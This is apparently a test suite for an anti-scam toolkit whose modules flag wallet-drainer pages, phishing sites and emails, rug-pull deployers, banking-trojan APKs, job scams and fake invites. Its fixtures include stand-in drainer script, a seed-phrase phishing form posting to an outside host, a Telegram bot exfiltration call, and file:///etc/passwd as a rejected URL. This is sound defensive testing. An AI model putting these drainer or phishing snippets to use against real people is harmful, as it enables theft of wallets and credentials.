import assert from 'node:assert/strict';
import { test } from 'node:test';
import { crc32, deflateRawSync } from 'node:zlib';
import { createContext } from '../src/core/context.js';
import { siteCheck } from '../src/modules/site.js';
import { explainTx } from '../src/modules/txexplain.js';
import { deployerCheck } from '../src/modules/deployer.js';
import { emlCheck, mimeParts } from '../src/modules/eml.js';
import { apkCheck, parseAxml } from '../src/modules/apk.js';
import { jobCheck } from '../src/modules/job.js';
import { readExif, sunElevation, whereCheck } from '../src/modules/where.js';
import { archivePage } from '../src/modules/archive.js';
import { inviteCheck } from '../src/modules/invite.js';
import { publicUrl } from '../src/core/safeurl.js';
import { renderPdf } from '../src/core/pdf.js';
import { NOW } from './helpers.js';

type Body = { method?: string; params?: unknown[] } | null;
/** Context whose fetch answers by URL (and JSON-RPC method), returning [status, body, final URL]. */
function ctxWith(answer: (url: string, body: Body) => unknown) {
  const fetch = (async (input: string | URL | Request, init?: RequestInit) => {
    const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url;
    let body: Body = null;
    try { body = init?.body ? JSON.parse(Buffer.from(init.body as Uint8Array).toString('utf8')) : null; } catch {}
    const out = answer(url, body);
    if (out === undefined) return new Response('not found', { status: 404 });
    if (typeof out === 'object' && out && 'html' in (out as object)) {
      const o = out as { html: string; status?: number; finalUrl?: string };
      const res = new Response(o.html, { status: o.status ?? 200 });
      if (o.finalUrl) Object.defineProperty(res, 'url', { value: o.finalUrl });
      return res;
    }
    return new Response(typeof out === 'string' ? out : JSON.stringify(out), { status: 200 });
  }) as typeof globalThis.fetch;
  return createContext({ dbPath: ':memory:', fetch, throttle: false, retryDelayMs: 1, now: () => NOW });
}
const word = (h: string) => h.replace(/^0x/, '').padStart(64, '0');
const rpc = (result: unknown) => ({ jsonrpc: '2.0', id: 1, result });
const abiStr = (s: string) => '0x' + word('20') + word(s.length.toString(16)) + Buffer.from(s).toString('hex').padEnd(64, '0');

test('safe links: only public http(s) hosts are opened', () => {
  assert.equal(publicUrl('example.com/a').href, 'https://example.com/a');
  for (const bad of ['http://127.0.0.1/', 'http://localhost:3000', 'file:///etc/passwd', 'https://router.lan/', 'https://example.com:22/']) assert.throws(() => publicUrl(bad));
});

test('site check: a drainer page with a receiver address, a phishing page with a seed form and a Telegram bot, and the real app', async () => {
  const drainJs = 'const cfg={receiver:"0x1111111111111111111111111111111111111111"};window.ethereum.request({method:"eth_requestAccounts"});fetch("https://api.ankr.com/multichain",{body:JSON.stringify({method:"ankr_getAccountBalance"})});const p={primaryType:"PermitBatch"};';
  const ctx = ctxWith((url) => {
    if (url === 'https://claim-arb-drop.xyz/') return { html: '<html><title>Arbitrum airdrop claim</title><script src="/app.js"></script><h1>Claim your ARB</h1></html>' };
    if (url === 'https://claim-arb-drop.xyz/app.js') return { html: drainJs };
    if (url === 'https://metamask-restore.top/') return { html: '<title>MetaMask</title><h1>Restore your wallet</h1><p>Enter your 12-word secret recovery phrase</p><form action="https://collect.example/s.php"><textarea name="seed"></textarea></form><script>fetch("https://api.telegram.org/bot123456789:AAEexampleexampleexampleexampleexample/sendMessage")</script>' };
    if (url === 'https://app.uniswap.org/') return { html: '<title>Uniswap Interface</title><script>window.ethereum; const s="eth_sign"; const p="0x000000000022d473030f116ddee9f6b43ac78ba3";</script>' };
    if (url.includes('rdap')) return { events: [{ eventAction: 'registration', eventDate: url.includes('uniswap') ? '2018-01-01T00:00:00Z' : '2026-11-15T00:00:00Z' }] };
    return undefined;
  });
  const d = await siteCheck(ctx, 'https://claim-arb-drop.xyz/');
  assert.equal(d.result.verdict, 'wallet drainer');
  assert.match(d.result.reasons.join(' '), /receiver address is written/);
  assert.match(d.result.reasons.join(' '), /token balances/);
  const p = await siteCheck(ctx, 'https://metamask-restore.top/');
  assert.equal(p.result.verdict, 'phishing page');
  assert.match(p.result.reasons.join(' '), /seed phrase/);
  assert.deepEqual(p.result.exfil, ['Telegram bot 123456789']);
  assert.ok(p.result.forms[0]!.external);
  const u = await siteCheck(ctx, 'https://app.uniswap.org/');
  assert.equal(u.result.verdict, 'no known risk found');
  assert.match(u.result.reasons.join(' '), /official domain of uniswap/);
});

test('tx explainer: tokens taken with an earlier approval, spam transfers recognized', async () => {
  const VICTIM = '0x' + 'a'.repeat(40), DRAINER = '0x' + 'd'.repeat(40), USDC = '0x' + 'c'.repeat(40), SPAM = '0x' + 'e'.repeat(40);
  const T = '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef';
  const ctx = ctxWith((url, b) => {
    if (b?.method === 'eth_getTransactionByHash') return rpc({ from: DRAINER, to: USDC, value: '0x0', input: '0x23b872dd' + word(VICTIM) + word(DRAINER) + word('3b9aca00'), blockNumber: '0x10', gasPrice: '0x3b9aca00' });
    if (b?.method === 'eth_getTransactionReceipt') return rpc({ status: '0x1', gasUsed: '0x5208', logs: [
      { address: USDC, topics: [T, '0x' + word(VICTIM), '0x' + word(DRAINER)], data: '0x' + word('3b9aca00') },
      { address: SPAM, topics: [T, '0x' + word(VICTIM), '0x' + word(DRAINER)], data: '0x' + word('ff') },
    ] });
    if (b?.method === 'eth_getBlockByNumber') return rpc({ timestamp: '0x691c0000' });
    if (b?.method === 'eth_getCode') return rpc('0x');
    if (b?.method === 'eth_call') {
      const p = (b.params as { to: string; data: string }[])[0]!;
      if (p.data === '0x95d89b41') return rpc(abiStr(p.to === USDC ? 'USDC' : 'SPAM'));
      if (p.data === '0x313ce567') return rpc('0x' + word('6'));
      return rpc('0x');
    }
    if (url.includes('dexscreener')) return [{ baseToken: { address: USDC }, liquidity: { usd: 5_000_000 } }];
    if (url.includes('openchain')) return { ok: true, result: { function: { '0x23b872dd': [{ name: 'transferFrom(address,address,uint256)' }] } } };
    return undefined;
  });
  const r = await explainTx(ctx, '0x' + '1'.repeat(64), { chain: 'eth' });
  assert.equal(r.result.verdict, 'tokens taken by someone else');
  assert.equal(r.result.function, 'transferFrom(address,address,uint256)');
  assert.match(r.result.reasons[0]!, /1,000 USDC left 0xaaaa/);
  assert.match(r.result.reasons.join(' '), /SPAM.*spam token faking a transfer/);
});

test('creator record: most earlier tokens dead', async () => {
  process.env.ETHERSCAN_API_KEY ||= 'test';
  const TOKEN = '0x' + '9'.repeat(40), DEP = '0x' + '8'.repeat(40);
  const olds = ['1', '2', '3', '4'].map((x) => '0x' + x.repeat(40));
  const ctx = ctxWith((url, b) => {
    if (url.includes('getcontractcreation')) return { status: '1', result: [{ contractAddress: TOKEN, contractCreator: DEP, txHash: '0x', timestamp: '1763000000' }] };
    if (url.includes('action=txlist')) return { status: '1', result: [
      { hash: '0xf', from: '0x' + '7'.repeat(40), to: DEP, value: '1000000000000000000', timeStamp: '1700000000', isError: '0' },
      ...olds.map((a, i) => ({ hash: '0x' + i, from: DEP, to: '', contractAddress: a, value: '0', timeStamp: String(1700000000 + i * 1000), isError: '0' })),
    ] };
    if (url.includes('dexscreener')) return [{ baseToken: { address: TOKEN }, liquidity: { usd: 20000 } }, { baseToken: { address: olds[0] }, liquidity: { usd: 300 } }];
    if (b?.method === 'eth_call') { const p = (b.params as { data: string }[])[0]!; return rpc(p.data === '0x313ce567' ? '0x' + word('12') : abiStr('RUG')); }
    return undefined;
  });
  const r = await deployerCheck(ctx, TOKEN);
  assert.equal(r.result.deployer, DEP);
  assert.equal(r.result.dead, 4);
  assert.equal(r.result.verdict, 'serial rug deployer');
});

test('email file: MIME parts, a scam body with a link, a PDF and an HTML attachment', async () => {
  const pdf = renderPdf([{ t: 'p', text: 'Invoice' }], 'x').toString('base64');
  const eml = [
    'From: "PayPal Service" <service@paypa1-support.top>', 'To: you@example.com', 'Subject: =?UTF-8?B?WW91ciBhY2NvdW50IGlzIGxvY2tlZA==?=', 'Date: Mon, 16 Nov 2026 10:00:00 +0000',
    'MIME-Version: 1.0', 'Content-Type: multipart/mixed; boundary="b1"', '',
    '--b1', 'Content-Type: text/plain; charset=utf-8', 'Content-Transfer-Encoding: quoted-printable', '', 'Your account has been suspended. Verify your account immediately at https://paypa1-support.top/l=\nogin', '',
    '--b1', 'Content-Type: application/pdf; name="invoice.pdf"', 'Content-Disposition: attachment; filename="invoice.pdf"', 'Content-Transfer-Encoding: base64', '', pdf, '',
    '--b1', 'Content-Type: text/html; name="secure-login.html"', 'Content-Disposition: attachment; filename="secure-login.html"', '', '<form action="https://x.example">', '',
    '--b1--', '',
  ].join('\r\n');
  const { head, parts } = mimeParts(Buffer.from(eml, 'latin1'));
  assert.equal(parts.length, 3);
  assert.match(head['content-type']!, /multipart\/mixed/);
  const ctx = ctxWith(() => undefined);
  const r = await emlCheck(ctx, Buffer.from(eml, 'latin1'), 'mail.eml');
  assert.equal(r.result.subject, 'Your account is locked');
  assert.deepEqual(r.result.attachments.map((a) => [a.name, a.check]), [['invoice.pdf', 'document'], ['secure-login.html', 'hash']]);
  assert.equal(r.result.attachments[1]!.tone, 'bad');
  assert.equal(r.result.verdict, 'dangerous email');
});

/** A binary Android manifest with a package, permissions and an accessibility service. */
function axml(pkg: string, perms: string[], servicePerm: string): Buffer {
  const strs = ['manifest', 'package', 'uses-permission', 'name', 'application', 'service', 'permission', pkg, ...perms, servicePerm];
  const idx = (s: string) => strs.indexOf(s);
  const enc = strs.map((s) => { const b = Buffer.alloc(2 + s.length * 2 + 2); b.writeUInt16LE(s.length, 0); b.write(s, 2, 'utf16le'); return b; });
  const offs = Buffer.alloc(strs.length * 4); let o = 0; enc.forEach((e, i) => { offs.writeUInt32LE(o, i * 4); o += e.length; });
  const data = Buffer.concat(enc); const pad = Buffer.alloc((4 - (data.length % 4)) % 4);
  const sp = Buffer.alloc(28); sp.writeUInt16LE(1, 0); sp.writeUInt16LE(28, 2); sp.writeUInt32LE(28 + offs.length + data.length + pad.length, 4); sp.writeUInt32LE(strs.length, 8); sp.writeUInt32LE(28 + offs.length, 20);
  const el = (name: string, attrs: [string, string][]) => {
    const h = Buffer.alloc(36); h.writeUInt16LE(0x0102, 0); h.writeUInt16LE(16, 2); h.writeUInt32LE(36 + attrs.length * 20, 4); h.writeUInt32LE(0xffffffff, 12); h.writeUInt32LE(0xffffffff, 16); h.writeUInt32LE(idx(name), 20); h.writeUInt16LE(20, 24); h.writeUInt16LE(20, 26); h.writeUInt16LE(attrs.length, 28);
    const at = attrs.map(([k, v]) => { const a = Buffer.alloc(20); a.writeUInt32LE(0xffffffff, 0); a.writeUInt32LE(idx(k), 4); a.writeUInt32LE(idx(v), 8); a.writeUInt16LE(8, 12); a[15] = 3; a.writeUInt32LE(idx(v), 16); return a; });
    return Buffer.concat([h, ...at]);
  };
  const body = Buffer.concat([sp, offs, data, pad, el('manifest', [['package', pkg]]), ...perms.map((p) => el('uses-permission', [['name', p]])), el('application', []), el('service', [['permission', servicePerm]])]);
  const head = Buffer.alloc(8); head.writeUInt16LE(3, 0); head.writeUInt16LE(8, 2); head.writeUInt32LE(8 + body.length, 4);
  return Buffer.concat([head, body]);
}
function zip(files: Record<string, Buffer>): Buffer {
  const parts: Buffer[] = [], central: Buffer[] = []; let off = 0;
  for (const [name, data] of Object.entries(files)) {
    const comp = deflateRawSync(data), nm = Buffer.from(name), crc = crc32(data) >>> 0;
    const lh = Buffer.alloc(30); lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(8, 8); lh.writeUInt32LE(crc, 14); lh.writeUInt32LE(comp.length, 18); lh.writeUInt32LE(data.length, 22); lh.writeUInt16LE(nm.length, 26);
    const ch = Buffer.alloc(46); ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(8, 10); ch.writeUInt32LE(crc, 16); ch.writeUInt32LE(comp.length, 20); ch.writeUInt32LE(data.length, 24); ch.writeUInt16LE(nm.length, 28); ch.writeUInt32LE(off, 42);
    parts.push(lh, nm, comp); central.push(ch, nm); off += 30 + nm.length + comp.length;
  }
  const cd = Buffer.concat(central), end = Buffer.alloc(22); end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(central.length / 2, 8); end.writeUInt16LE(central.length / 2, 10); end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(off, 16);
  return Buffer.concat([...parts, cd, end]);
}

test('APK check: binary manifest parsed, banking-trojan permissions flagged', async () => {
  const man = axml('com.parcel.tracking.viewer', ['android.permission.RECEIVE_SMS', 'android.permission.READ_SMS', 'android.permission.INTERNET', 'android.permission.SYSTEM_ALERT_WINDOW'], 'android.permission.BIND_ACCESSIBILITY_SERVICE');
  const nodes = parseAxml(man);
  assert.equal(nodes[0]!.attrs.package, 'com.parcel.tracking.viewer');
  const ctx = ctxWith(() => undefined);
  const r = await apkCheck(ctx, zip({ 'AndroidManifest.xml': man, 'classes.dex': Buffer.from('dex\n035') }), 'parcel.apk');
  assert.equal(r.result.package, 'com.parcel.tracking.viewer');
  assert.equal(r.result.verdict, 'dangerous app');
  assert.match(r.result.reasons.join(' '), /accessibility/);
  assert.match(r.result.reasons.join(' '), /one-time banking codes/);
  assert.deepEqual(r.result.services, ['BIND_ACCESSIBILITY_SERVICE']);
});

test('job check: the paid-task pattern', async () => {
  const ctx = ctxWith(() => undefined);
  const r = await jobCheck(ctx, 'Congratulations, you have been selected! Part-time online job, earn $300 per day rating hotels. Complete 40 tasks per set; a deposit of 50 USDT unlocks the next set. Contact HR on WhatsApp. No interview needed.');
  assert.equal(r.result.verdict, 'job scam');
  assert.ok(r.result.patterns.some((p) => /paid "tasks"/.test(p.name)));
});

/** A JPEG whose EXIF holds a GPS position and a capture time. */
function jpegWithGps(lat: number, lon: number, when: string): Buffer {
  const be = (n: number, b = 2) => { const x = Buffer.alloc(b); if (b === 2) x.writeUInt16BE(n); else x.writeUInt32BE(n); return x; };
  const entry = (tag: number, type: number, count: number, value: Buffer) => Buffer.concat([be(tag), be(type), be(count, 4), value.length <= 4 ? Buffer.concat([value, Buffer.alloc(4 - value.length)]) : value]);
  // Layout: header(8) | IFD0 at 8 | ExifIFD | GPS IFD | data
  const dms = (v: number) => { const a = Math.abs(v), d = Math.floor(a), m = Math.floor((a - d) * 60), s = Math.round(((a - d) * 60 - m) * 60 * 100); return Buffer.concat([be(d, 4), be(1, 4), be(m, 4), be(1, 4), be(s, 4), be(100, 4)]); };
  const ifd0At = 8, exifAt = ifd0At + 2 + 2 * 12 + 4, gpsAt = exifAt + 2 + 12 + 4, dataAt = gpsAt + 2 + 4 * 12 + 4;
  const dt = Buffer.from(`${when}\0`, 'latin1');
  const latB = dms(lat), lonB = dms(lon);
  const ifd0 = Buffer.concat([be(2), entry(0x8769, 4, 1, be(exifAt, 4)), entry(0x8825, 4, 1, be(gpsAt, 4)), be(0, 4)]);
  const exif = Buffer.concat([be(1), entry(0x9003, 2, dt.length, be(dataAt, 4)), be(0, 4)]);
  const gps = Buffer.concat([be(4), entry(1, 2, 2, Buffer.from(lat < 0 ? 'S\0' : 'N\0')), entry(2, 5, 3, be(dataAt + dt.length, 4)), entry(3, 2, 2, Buffer.from(lon < 0 ? 'W\0' : 'E\0')), entry(4, 5, 3, be(dataAt + dt.length + 24, 4)), be(0, 4)]);
  const tiff = Buffer.concat([Buffer.from('MM\0*', 'latin1'), be(8, 4), ifd0, exif, gps, dt, latB, lonB]);
  const app1 = Buffer.concat([Buffer.from('Exif\0\0', 'latin1'), tiff]);
  return Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe1]), be(app1.length + 2), app1, Buffer.from([0xff, 0xd9])]);
}

test('photo location: EXIF GPS and time, place, weather at that hour, sun position', async () => {
  const jpg = jpegWithGps(51.5007, -0.1246, '2026:06:21 12:00:00');
  const x = readExif(jpg);
  assert.ok(Math.abs(x.gps!.lat - 51.5007) < 0.001 && Math.abs(x.gps!.lon + 0.1246) < 0.001);
  assert.equal(x.dto, '2026:06:21 12:00:00');
  const ctx = ctxWith((url) => {
    if (url.includes('nominatim')) return { display_name: 'Westminster, London, United Kingdom', address: { country: 'United Kingdom' } };
    if (url.includes('open-meteo')) return { utc_offset_seconds: 3600, hourly: { time: ['2026-06-21T11:00', '2026-06-21T12:00'], temperature_2m: [19, 21.5], precipitation: [0, 2.4], cloud_cover: [90, 100], weather_code: [3, 63], is_day: [1, 1] } };
    return undefined;
  });
  const r = await whereCheck(ctx, jpg, 'p.jpg');
  assert.equal(r.result.verdict, 'location found');
  assert.equal(r.result.country, 'United Kingdom');
  assert.equal(r.result.weather?.condition, 'rain');
  assert.equal(r.result.weather?.precipMm, 2.4);
  assert.ok((r.result.weather?.sunElevation ?? 0) > 55, 'midsummer noon in London');
  assert.ok(sunElevation(51.5, -0.12, new Date('2026-12-21T23:00:00Z')) < -40);
});

test('archive: saved now, or the newest earlier snapshot when saving fails', async () => {
  const ok = ctxWith((url) => (url.startsWith('https://web.archive.org/save/') ? { html: '<html>saved</html>', finalUrl: 'https://web.archive.org/web/20261118120000/https://scam.example/' } : url === 'https://scam.example/' ? { html: '<title>Scam</title>' } : undefined));
  const a = await archivePage(ok, 'https://scam.example/');
  assert.equal(a.result.verdict, 'saved now');
  assert.equal(a.result.snapshotTime, '2026-11-18T12:00:00Z');
  assert.equal(a.result.page?.title, 'Scam');
  assert.equal(a.result.page?.sha256.length, 64);
  const busy = ctxWith((url) => (url.startsWith('https://web.archive.org/save/') ? { html: 'busy', status: 429 } : url.includes('wayback/available') ? { archived_snapshots: { closest: { available: true, url: 'http://web.archive.org/web/20261101000000/https://scam.example/', timestamp: '20261101000000' } } } : undefined));
  const b = await archivePage(busy, 'https://scam.example/');
  assert.equal(b.result.verdict, 'earlier snapshot only');
  assert.match(b.result.snapshot!, /^https:/);
});

test('invite check: fake support on Telegram, a new Discord server posing as a project, a verified one', async () => {
  const ctx = ctxWith((url) => {
    if (url === 'https://t.me/binance_support_help') return { html: '<div class="tgme_page_title"><span>Binance Support</span></div><meta property="og:title" content="Binance Support"><div class="tgme_page_extra">312 members</div>' };
    if (url === 'https://t.me/durov') return { html: '<div class="tgme_page_title"><span>Pavel Durov<i class="verified-icon"></i></span></div><meta property="og:title" content="Pavel Durov"><div class="tgme_page_extra">9 866 547 subscribers</div>' };
    if (url.includes('discord.com/api/v10/invites/arbclaim')) return { guild: { id: String((BigInt(Date.parse('2026-11-10T00:00:00Z') - 1420070400000) << 22n)), name: 'Arbitrum Airdrop Official', features: [] }, approximate_member_count: 40, approximate_presence_count: 3 };
    return undefined;
  });
  const t = await inviteCheck(ctx, 't.me/binance_support_help');
  assert.equal(t.result.verdict, 'likely impersonation');
  assert.equal(t.result.members, 312);
  const v = await inviteCheck(ctx, 'https://t.me/durov');
  assert.equal(v.result.verified, true);
  assert.equal(v.result.verdict, 'no known risk found');
  const d = await inviteCheck(ctx, 'https://discord.gg/arbclaim');
  assert.equal(d.result.createdAt, '2026-11-10T00:00:00.000Z');
  assert.equal(d.result.verdict, 'likely impersonation');
  const gone = await inviteCheck(ctx, 'discord.gg/nothing');
  assert.equal(gone.result.verdict, 'invite not valid');
});
